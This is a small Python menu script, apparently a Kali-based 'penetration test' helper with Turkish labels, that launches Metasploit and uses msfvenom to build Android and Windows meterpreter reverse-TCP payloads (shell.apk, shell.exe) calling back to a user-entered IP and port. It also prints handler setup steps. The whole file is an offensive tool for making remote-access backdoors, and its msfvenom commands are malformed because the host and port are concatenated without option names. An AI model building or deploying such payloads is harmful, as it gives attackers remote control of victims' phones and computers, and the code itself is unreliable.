import os
os.system("figlet SIZMA TESTİ | lolcat")
print("""

1-payload

2-msfconsole

3-use exploit/multi/handler

4-set PAYLOAD windows/meterpreter/reverse_tcp
  set payload android/meterpreter/reverse_tcp

5-LHOST=192.168.2.2 LPORT=1604 R > Desktop/test.apk

7-exploit






""")
islemno = input(" > ")
if(islemno=="2"):
        os.system("msfconsole ")


        islem1 = input("enter the transaction number > ")


elif(islemno=="1"):
        print("""

2)apk

1)exe

0)exit

        """)
        islem1 = input("enter the transaction number > ")
        if(islem1=="2"):
                LHOST = input("IP > ")
                LPORT = input("PORT > ")
                os.system(" msfvenom -p android/meterpreter/reverse_tcp " + LHOST + LPORT + "R > /home/kali/Desktop/shell.apk")
        elif(islem1=="1"):
                LHOST = input("IP > ")
                LPORT = input("PORT > ")
                os.system(" msfvenom -p windows/meterpreter/reverse_tcp " + LHOST + LPORT + " > /home/kali/Desktop/shell.exe")
        elif(islem1=="0"):
                os.system("python3 haydar")
        else:
                print("please make sure you enter an accurate value ...")

elif(islemno=="0"):

        sor1 = input("Are You Sure?  yes / no >  ")

        if(sor1=="yes"):
                os.system("exit")

        if(sor1=="no"):
                os.system("python3 haydar")

else:
        print("please make sure you enter an accurate value ...")
